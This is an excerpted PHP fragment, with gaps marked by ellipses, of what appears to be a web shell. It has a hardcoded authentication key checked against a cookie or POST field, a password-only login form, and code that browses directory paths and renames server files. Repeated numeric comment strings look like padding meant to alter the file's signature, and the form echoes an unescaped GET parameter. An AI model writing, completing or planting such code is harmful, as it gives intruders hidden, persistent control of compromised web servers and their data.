...
$auth_key = "f21e163c771e99796ee79fcad4cce961";
...
$pass = false;
if (isset($_COOKIE['pw_name_83103'])) {
    if(($_COOKIE['pw_name_83103']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_83103'])) {
        if(($_POST['pw_name_83103']) == $auth_key) {
            setcookie("pw_name_83103", $_POST['pw_name_83103']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_83103' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1725823931757539 1725823931159058 1725823931992645 1725823931645967
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1725823931757539 1725823931159058 1725823931992645 1725823931645967
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1725823931757539 1725823931159058 1725823931992645 1725823931645967
            $name = PATH . "/" . $_GET['r'];
